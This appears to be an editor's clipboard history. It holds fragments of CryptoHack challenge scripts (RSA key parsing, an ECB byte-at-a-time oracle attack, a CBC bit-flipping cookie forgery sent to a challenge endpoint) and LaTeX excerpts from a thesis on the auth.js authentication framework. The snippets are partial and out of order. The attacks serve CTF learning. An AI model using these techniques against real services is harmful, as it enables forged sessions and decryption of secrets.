	    print(keypair))
db4ad4cd27411bf4ebca96867d96b4e9|file:///home/neo/cryptohack/general/data-formats/data_formats.py|8|5|V|python
	    print(keypair[-len(suffix):])
3f1b96c2465aac48f1dc86baef63b2d9|file:///home/neo/cryptohack/general/data-formats/data_formats.py|8|5|V|python
	    print(suffix)
83658f43ac1fd48f2717524635a40095|file:///home/neo/cryptohack/general/data-formats/data_formats.py|13|28|v|python
	keypair[len(prefix
3d2ce0ead089de9fc800a7f3f3772751|file:///home/neo/cryptohack/general/data-formats/data_formats.py|13|28|v|python
	keypair[len(prefix):-len(suffix)]
95709523297a6f1d1e01a70fdeb9fe86|file:///home/neo/cryptohack/general/data-formats/data_formats.py|3|1|V|python
	
	def extract_private_key_pem(keypair: str):
	    prefix = '-----BEGIN RSA PRIVATE KEY-----'
	    suffix = '-----END RSA PRIVATE KEY-----\n'
	
	    if keypair[:len(prefix)] != prefix:
	        raise Exception('Wrong prefix')
	    if keypair[-len(suffix):] != suffix:
	        raise Exception('Wrong suffix')
	
	    print(keypair[len(prefix):-len(suffix)])
	    der = base64.b64decode(keypair[len(prefix):-len(suffix)])
	    print(der)
	
	    return None
	
cd5f707db3a6730aafa981a6b0f776d6|file:///home/neo/cryptohack/general/data-formats/data_formats.py|8|19|v|python
	extract_private_key_pem(keypair)
80243434f9775f71b7b39462e34211f8|file:///home/neo/cryptohack/general/data-formats/data_formats.py|13|5|V|python
	    print(keypair[len(prefix):-len(suffix)])
09e8ec7d139b515fe62b36faa1110cf5|file:///home/neo/cryptohack/general/data-formats/data_formats.py|14|5|V|python
	    print(der)
984ea6319bd62d143e8a244129ac043e|file:///home/neo/cryptohack/general/data-formats/data_formats.py|16|5|V|python
	    seq = asn1.DerSequence()
cd8f6b6235eb0fd4a8faa337a0a93e6c|file:///home/neo/cryptohack/general/data-formats/data_formats.py|17|5|V|python
	    print(priv_key.publickey())
27f846bf9d3a79e2fca44161bda54465|file:///home/neo/cryptohack/general/data-formats/data_formats.py|6|1|V|python
	def extract_private_key_pem(keypair: str):
685d7b4804da1f43f96eccf328d5e14e|file:///home/neo/cryptohack/general/data-formats/data_formats.py|16|1|V|python
	    priv_key = RSA.importKey(der).d
5e2f99710079239b5b69562765f9a439|file:///home/neo/cryptohack/general/data-formats/data_formats.py|20|13|v|python
	private_key_pem
a68d70e808c1efd099434e80123974e2|file:///home/neo/cryptohack/general/data-formats/data_formats.py|21|5|V|python
	    # der = base64.b64decode(der_b64)
aff44db89f96fb539432851540d33617|file:///home/neo/cryptohack/general/data-formats/data_formats.py|21|5|V|python
	    der_b64 = base64.b64encode(der)
28edadf5a842dd7f553844be7a213bb0|file:///home/neo/cryptohack/general/data-formats/data_formats.py|21|5|V|python
	    print(der_b64)
b58a4c64f52bbdeaa25b0457f63e9d4f|file:///home/neo/cryptohack/general/data-formats/data_formats.py|7|1|V|python
	    prefix = '-----BEGIN RSA PRIVATE KEY-----'
	    suffix = '-----END RSA PRIVATE KEY-----\n'
c8392b5a87158cc1353140513d7247a9|file:///home/neo/cryptohack/general/data-formats/data_formats.py|25|5|V|python
	    return RSA.importKey(key).n
21a8b5e42d5d8641e1bca4014712eeff|file:///home/neo/cryptohack/general/data-formats/data_formats.py|29|5|V|python
	    print(modulus)
84c6d22cfdf3772e66b07bde636e0571|file:///home/neo/cryptohack/general/data-formats/data_formats.py|21|30|v|python
	PRIVATE
7021093506653dce83a40a9b23bb1042|file:///home/neo/cryptohack/general/data-formats/data_formats.py|21|1|V|python
	def der_to_pem(der: str):
	    prefix = '-----BEGIN CERTIFICATE-----\n'
	    suffix = '\n-----END CERTIFICATE-----\n\n'
	    key = prefix + base64.b64encode(der).decode() + suffix
6ab006389cf369434a343e81b3773120|file:///home/neo/cryptohack/general/data-formats/data_formats.py|21|5|V|python
	    return key
092bac7f46d440cbfff4d8d33580d8f6|file:///home/neo/cryptohack/general/data-formats/data_formats.py|27|1|V|python
	    f = open('cert.pem', 'w')
	    f.write(key)
	    f.close()
9c3cf54dd97523ac40b83e851bbed089|file:///home/neo/cryptohack/general/data-formats/data_formats.py|29|15|v|python
	der_to_pem
abea6220a660d83972df6dc74b663ec7|file:///home/neo/cryptohack/general/data-formats/data_formats.py|27|5|V|python
	    # openssl
b335eb7ebe805ee35220a7745fd0427a|file:///home/neo/cryptohack/general/mathematics/mathematics.py|43|5|V|python
	    print(m)
897868551e2f53e825e1ab8c450abcbc|file:///home/neo/cryptohack/general/mathematics/mathematics.py|41|46|v|python
	 = n.remove(num)
dab7f77140a0431937423115830fda61|file:///home/neo/cryptohack/general/mathematics/mathematics.py|43|46|v|python
	.remove(num)
77a8392733b384466b7a1b6a792cd2b9|file:///home/neo/cryptohack/general/mathematics/mathematics.py|43|9|V|python
	        print(temp)
3e7ccf43ec1bfa10c8698a263823d600|file:///home/neo/cryptohack/general/mathematics/mathematics.py|41|9|V|python
	        print(num)
307f27baa11d8d97cdf8388451084f95|file:///home/neo/cryptohack/general/mathematics/mathematics.py|44|5|V|python
	    print(s)
16ccfff192ab41271981e27131a670e5|file:///home/neo/cryptohack/general/mathematics/mathematics.py|47|5|V|python
	    print(total)
f1017a9b5795b2543e7fb970d4f0a60a|file:///home/neo/cryptohack/general/mathematics/mathematics.py|47|5|V|python
	    total = sum(s)
7bdb23b610222ac9100b4f86683e12bc|file:///home/neo/cryptohack/general/mathematics/mathematics.py|46|12|v|python
	total % m
108e6d9deb18736020d9ad16ea93ebdf|file:///home/neo/cryptohack/general/mathematics2/adrien.py|5|1|V|python
	if __name__==''
543fa9efacae37b4c698a94214cdf779|file:///home/neo/cryptohack/general/mathematics2/adrien.py|3|14|v|python
	__main__
5d67d039941af4467f0b3913e41ba680|file:///home/neo/cryptohack/general/mathematics2/source.py|11|17|v|python
	''.join([bin(i)[2:].zfill(8) for i in flag])
4a6c0690b55ae638080626b4ca8eb3f0|file:///home/neo/cryptohack/general/mathematics2/source.py|3|1|V|python
	a = 288260533169915
	p = 1007621497415251
ea06d3d9923090bc576f4f526f9d63bf|file:///home/neo/cryptohack/general/mathematics2/source.py|13|1|V|python
	        e = randint(1, p)
	        n = pow(a, e, p)
aebaf0e591dfc04a33aaf713ef1e9dad|file:///home/neo/cryptohack/general/mathematics2/adrien.py|15|5|V|python
	    print(n + m)
f9c0d44bb230a8922d7e92323abc4d5d|file:///home/neo/cryptohack/general/mathematics2/adrien.py|15|5|V|python
	    print(p)
3c81d2fe4dfb594d7b7a4b1d0e55037b|file:///home/neo/cryptohack/general/mathematics2/adrien.py|16|12|V|python
	    print(p)
	    print(n + m)
758d0f020192736dcb28981da4627b78|file:///home/neo/cryptohack/general/xor/xor.py|2|1|V|python
	import sys, string, binascii
	sys.path.insert(1, '~/cryptohack')
68832fe97c9299da3b14e2337715d885|file:///home/neo/cryptohack/general/xor/xor.py|2|1|V|python
	import sys, string, binascii
	sys.path.insert(1, '~/cryptohack')
	from general.encoding.encoding import *
c4421e738aca033b23094601b2ab2f1a|file:///home/neo/cryptohack/general/mathematics2/adrien.py|5|14|v|python
	encoding.encoding import *
7a3d210bd67e980cac069fbfc6a8555d|file:///home/neo/cryptohack/general/mathematics2/output.py|1|1|V|python
	[67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]
712cf073cc49110db0d27af3253f412f|file:///home/neo/cryptohack/general/mathematics2/adrien.py|22|1|V|python
	output = [67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]
d6fe1d0be6347b8ef2427fa629c04485|file:///home/neo/cryptohack/general/mathematics2/adrien.py|10|19|v|python
	path
28fc1bb5d3cfd078e9e685ab0ff7258f|file:///home/neo/cryptohack/general/mathematics2/adrien.py|10|16|v|python
	C://numbers.txt
332b54e457809449a463e6a9eb48f7ee|file:///home/neo/cryptohack/general/mathematics2/adrien.py|18|1|V|python
	    for i in range(5):
	        print(output[i])
80da202de6b0254bf5c33eec5454b856|file:///home/neo/cryptohack/block-ciphers/starter/decrypt.py|4|16|v|python
	/usr/share/dict/words
c637030674b0adad0e88d380600c281c|file:///home/neo/cryptohack/block-ciphers/starter/decrypt.py|12|9|V|python
	        try:
eb9cb9294c72ce252bb798feed5dd636|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|4|8|v|python
	https://aes.cryptohack.org/ecb_oracle/encrypt/
3616cb697b82b1a3a41da34f72a512c9|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|7|5|V|python
	    print(URL + 'a/')
e999e0946a53d39d0d3400a5c2d9f7c0|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|12|1|V|python
	    print(enc)
41d24319a00151917a066568d28e732c|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|16|9|V|python
	        print(enc)
81482ce8df7809a8a4f6203b257a579e|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|8|5|V|python
	    secret_len = 64
4dc1b144ec378ace314795ef5274d0c1|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|8|5|V|python
	    total_blocks = secret_len // block_size
5b66b4ede708f5deacc7ca3173a4c299|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|10|5|V|python
	    print(prefix)
41e279399f22353eff7c73b58a89b18f|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|9|21|v|python
	secret_len
8572c9167714b21452e78948b2746721|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|9|20|v|python
	( + block_size)
4eb13e51a5e6871ec54bb88d287c524b|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|10|14|v|python
	hex(ord('a'))[2:] 
7d86ff5bf12ce6e59c2a2caa2fd0437a|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|11|1|V|python
	    r = requests.get(url= URL + prefix + '/') 
	    enc = bytes.fromhex(r.json()['ciphertext'])
29e7faa9811d3dbc0dc2ca6e826eaecf|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|26|23|V|python
	    # total_blocks = encrypted_len // block_size
	    # for block in range(total_blocks):
	    #     print(enc[block * block_size:(block+1) * block_size])
213b452822e62b0fed1a3f032fc6abd3|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|23|20|v|python
	encrypted_len
ca25d0c24de21b9a742264e66e0e9318|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|22|5|V|python
	    secret_len = 32
1cbac7ccd944be46143cf5d465c1883d|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|22|5|V|python
	    for block in range(total_blocks):
1365e62650e42afe20033f21125d34d5|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|12|1|V|python
	    enc = bytes.fromhex(r.json()['ciphertext'])[block_size:]
bc943609e79e4771f96d50a6eb6f5406|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|2|1|V|python
	impor
9775c964f3d62b4cfdcd344f57d61e7f|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|24|1|V|python
	        enc = bytes.fromhex(r.json()['ciphertext'])[block_size:]
021d3be5ed2cd7b9de0cdbfb8fb77489|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|11|1|V|python
	    r = requests.get(url= URL + prefix + '/') 
23102553ca8fe9b9aa15ac864f04cd4a|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|23|1|V|python
	        prefix = (16 * hex_a) + (block_size - i) * hex_a + decrypted
b0a068aa56dfdb2460eccf6e3f7b39aa|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|29|13|V|python
	            prefix = (16 * hex_a) + (block_size - i - 1) * hex_a + ''.join("{:02x}".format(ord(c)) for c in decrypted)
9b55856f0e606a6cb4d32fe57844ce24|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|30|10|V|python
	            print(prefix)
a4be276179a467bd7b100649c439976f|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|30|13|V|python
	            print(prefix + hex(ord(c))[2:])
bb8ae36376c2fc54593c97c856d236d8|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|37|13|V|python
	            print(decrypted)
770c65a0d9663cd6bf14c14efd84a065|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|34|13|V|python
	            print(output)
d44e84188cc81348966f357597739fb0|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|37|17|V|python
	                # print('found')
689bad679d199f81fd92a449c288a522|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|26|9|V|python
	        # print(enc)
bebcf5f04f2440f705e779310dfb0729|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|23|9|V|python
	        pre_append = (16 * hex_a) + (block_size - 1) * hex_a
4535f073c6a1ac3639fc098b83e5f707|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|35|5|V|python
	                print(output)
7f51bac858ffef6067514791d938cee7|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|24|9|V|python
	        print(pre_append)
2867785739f2808b299e1bb529bc0f6d|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|1|1|V|python
	#!/usr/share/python3
	import requests, string
0f5b45beb771aa4fb8d5e332ef275391|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|4|7|v|python
	'https://aes.cryptohack.org/ecb_oracle/encrypt/'
1d3e722f290fa43d9930f8bd814f56af|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|6|1|V|python
	URL_GET_COOKIE = 'https://aes.cryptohack.org/flipping_cookie/get_cookie/'
99ccdacfe40b6076f69686aaa5ed0b1b|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|11|1|V|python
	prefix = b'admin=False;expi'
851f5ac9941d720844d143ed9cfcf60a|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|13|5|v|python
	prefix
715a865d19c4becc2499a558ff53a1ff|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|15|5|V|python
	    print(expires_at)
e2c0ab9e47f20b1764f7b48de9dbca74|file:///home/neo/cryptohack/block-ciphers/ecb/decrypt.py|24|1|V|python
	        r = requests.get(url= URL + pre_append + '/') 
	        enc = bytes.fromhex(r.json()['ciphertext'])[block_size:]
d014dd8a0792e95d412e346837459304|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|18|5|V|python
	    cookie = 
84bea1f0fd2ce16f7e562a9f06ef03d3|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|8|14|v|python
	encoding
39d00072625775acd5918e5051f53fb6|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|8|14|v|python
	.encoding
5b05b2572a510a8131b26bc9fede4c44|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|21|5|V|python
	    print(second_block[:12])
087a0c6805bfbfb1a0819ca7fa67b553|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|18|5|V|python
	    print(len(target))
3d3f88c0a23869277230ad691986b753|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|20|1|V|python
	    r = requests.get(url= URL_GET_COOKIE) 
fcc05cfcc51330ece06cf649c78f4209|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|27|31|v|python
	GET_COOKIE
a8a7c910fe3229ffdb45097ac65912da|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|27|5|V|python
	    print(len(fake_first_block))
46c1d4ab73b55624e63b768d80051345|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|28|5|V|python
	    print(len(fake_cookie))
2895a8a59882931d0390172921dc3a03|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|28|1|V|python
	    print(fake_cookie.hex())
53fec2aff7cd187f8480c3b2b60241c9|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|20|25|V|python
	    print(len(first_block))
	    print(len(second_block))
9d3d0dc90adb74fcd8e1c4410e063401|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|25|41|v|python
	first_block[:-(16 - len(target))
8c9eb6f5edc37178873d58c499f57d20|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|25|62|v|python
	first_block[-(16 - len(target)):]
4df83201aabc1a60bda1e44be6458935|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|34|1|V|python
	    # r = requests.get(url= URL_CHECK_COOKIE + fake_cookie.hex() + '/' + iv.hex() + '/') 
	    # print(r.content)
ae7705863a125ac29b5499225ea7b7a7|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|24|46|V|python
	    r = requests.get(url= URL_CHECK_COOKIE + cookie.hex() + '/' + iv.hex() + '/') 
	    print(r.content)
d6db2f98cb01173b0f2454d62d57278a|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|31|1|V|python
	    fake_first_block = xor_bytes(target, first_block[:len(target)]) + first_block[-(16 - len(target)):] 
	    print(fake_first_block)
	    fake_cookie = fake_first_block + second_block
	    print(fake_cookie)
	    r = requests.get(url= URL_CHECK_COOKIE + fake_cookie.hex() + '/' + iv.hex() + '/') 
	    print(r.content)
	
4ca1971dace25339e435fcbf17f15493|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|19|5|V|python
	    # second_block = pad(f'ry={expires_at}'.encode(), 16)
861ef78b09b7045f313d822f3098d32f|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|19|5|V|python
	    expires_at = (datetime.today() + timedelta(days=1)).strftime("%s")
e3e53fb7e148abe41eccc1d18f1e79cc|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|28|5|V|python
	    # print(target)
698affe03374e0f92c606042f053e443|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|31|5|V|python
	    # print(fake_cookie)
edaac895bb9e67d2853ea970e2407551|file:///home/neo/cryptohack/block-ciphers/cbc/decrypt.py|16|5|V|python
	    # first_block = b'admin=False;expi'
18218139eec55d83cf82679934e5cd75|file:///home/neo/Documents/epl682/report/report.tex|24|335|v|tex
	will
4e9ea33b384616fd6ab4987891ea4675|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|1|1|V|tex
	\begin{abstract}
	
	Several research works attempt to replace simple authentication schemes, where
	the cryptographic digest of a plaintext password is stored at the server. Those
	proposals are based on more elaborate schemes, such as PAKE-based protocols.
	However, in practice, only a very limited amount of applications in the web use
	such schemes. The reason for this limited deployment is perhaps 
	their complexity as far as the cryptography involved is concerned.
	Today, even the most successful web applications use text-based
	passwords, which are simply hashed and stored at the server. This has broad implications
	for both the service and the user. Essentially, the users are forced to reveal
	their plain passwords for both registering and authenticating with a service.
	
	In this paper, we attempt to make it easier for any web service to a) enable
	easily advanced authentication schemes, and b) switch from one scheme to
	another.  More precisely, we design and realize {\tt auth.js}, a framework that
	allows a web application to offer advanced authentication that leverages
	sophisticated techniques compared to typical cryptographically hashed
	text-based passwords. In fact, {\tt auth.js} can be easily enabled in all web
	applications and supports traditional passwords -- however, once enabled,
	switching to a more elaborate scheme is straight forward. {\tt auth.js}
	leverages advanced cryptographic primitives, which can be used for implementing
	strong authentication, such as PAKE and similar solutions, by ensuring that all
	cryptographic primitives are trusted and executed using the browser's engine. For
	this, we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve. Finally, we evaluate {\tt auth.js}
	with real web applications, such as WordPress.
	
	
	
	\end{abstract}
7e3f660480ab1640de8024c200b5a4d3|file:///home/neo/Documents/thesis/abstract.tex|14|9|v|tex
	paper
e5374f4e469f1f72b115cd296372c600|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|1|1|V|tex
	\section{Architecture}\label{sec:architecture}
	
	In this section we provide an overview of the architecture of {\tt auth.js}, as
	well as the steps needed to be taken by the web application programmer in order
	to use the framework. We also provide an example of a use case where a server
	chooses to use an advanced authentication scheme based on public-key cryptography, and specifically based on the authentication scheme of Keybase described in Section~\ref{sec:background}, to
	register and authenticate its users. This scheme is referenced as {\tt scrypt\_seed\_ed25519\_keypair} by the {\tt auth.js} API. The cryptographic primitives required to be performed for 
	the authentication and registration are handled on the client side by the {\tt auth.js} framework,
	which uses the client's browser engine to ensure that the cryptographic operations
	are performed in a secure context.
	
	\subsection{Overview}
	
	{\tt auth.js} provides simple API calls for the programmer that wants to use
	advanced authentication techniques in their web application, without needing to
	worry about the underlying implementation. This is especially important for the
	various cryptographic elements, which may be leveraged during authentication.
	First, the programmer does not need to re-implement any cryptographic
	primitives and, second, all primitives are enforced by the web browser, which
	we consider trusted.
	
	When a client requests a web application, the web server will direct the client to retrieve a copy of {\tt auth.js}. The library can be provided to the client either by the web server directly, or via a trusted third party such as a Content Distribution Network, as seen in Figure~\ref{fig:architecture}. After retrieving the library, the client is able to start the registration or authentication process. In particular, our library provides two API calls, {\tt authenticate} and {\tt register} that, when called, will use the client's browser Web Crypto API to perform the correct cryptographic operations depending on the chosen authentication scheme. For example, in the case of the {\tt scrypt\_seed\_ed25519\_keypair} scheme, the library will use the implemented {\tt scrypt} hash function and the {\tt Ed25519} key generation to create a key pair using the user's password. For authentication, it will use the generated private key to sign a nonce sent by the server using the {\tt Ed25519} signature scheme, to prove ownership of the private key.
	
	Our library currently supports traditional plain password authentication, as well as the more advanced public key authentication scheme based on the Keybase authentication. It can be extended to support any authentication scheme, as long as the browser supports the corresponding cryptographic primitives.
	
	\begin{figure}[ht]
	  \centering \includegraphics[scale=0.6]{images/auth_overview.pdf}
	  \caption{Overview of the architecture of {\tt auth.js}. The client requests the web application from the server (1). The server responds by sending the html file, which directs the client to retrieve {\tt auth.js} from a trusted third party, as well as with a JavaScript file in which the authentication options are initialized (2). The client then retrieves {\tt auth.js} from the trusted source (3 and 4). The client's browser prompts the user for a password and the register API call from {\tt auth.js} is used to generate the correct credential (5). In this case the generated credential is the user's public key, which is generated based on the password which the user provided. Finally, the credential is sent to the server (6), where it will be verified.}
	  \label{fig:architecture}
	\end{figure}
	
	\subsection{auth.js API}
	% \elathan{Consistency check, JavaScript should be always capitalized as "JavaScript".}
	\subsubsection{Usage}
	Our JavaScript library provides an easy-to-use API that can be used by the web application programmer with minimal effort. The library will be used as follows: 
	
	\begin{itemize}
	    \item The server that wants to use our library includes {\tt auth.js} in the web application's source.
	    \item The desired authentication options must be initialized by the web programmer using the {\tt initializeCredentialType} API call in the main web application (e.g.\ in the JavaScript file served by the web server), as depicted in Listing~\ref{lst:init_authjs}. This call takes as an argument a JSON object describing the authentication options. The library currently supports two options. First, the {\tt passwordMinLength} option allows the server to choose the minimum password length it can accept. The second option, {\tt passwordProcessMethod}, enforces the use of one of the supported authentication schemes. The currently supported schemes are {\tt plain}, which is the traditional text-based password and {\tt scrypt\_seed\_ed25519\_keypair}. If the {\tt initializeCredentialType} call is not used, the library will use the default values of no minimum password length and the {\tt plain} authentication scheme.  
	    \item After initializing the options, the {\tt authenticate} and {\tt register} calls can be used. Those calls are placed in the web application's JavaScript source by the web programmer, to be called when the user tries to perform a authentication or registration action. The {\tt register} function takes as argument the password which the user typed and returns the corresponding credential based on the chosen authentication scheme, to be sent to the server. The {\tt authenticate} function also takes as argument the user's password and, in the case where an advanced public-key based authentication scheme is used, the optional "message" argument, which is the nonce that should be signed using the user's private key. The function generates the private key based on the password, signs the message, if needed, and returns the signed message. In the case of the plain authentication scheme, the two functions simply return the user's password.
	    \item The web application sends the generated credential to the server. If the authentication or registration is successful, the user can continue using the web application as usual.
	\end{itemize}
	
	% \elathan{Use labels to references listings (as we do with tables/figures) -- see below.}
	\subsubsection{Example}
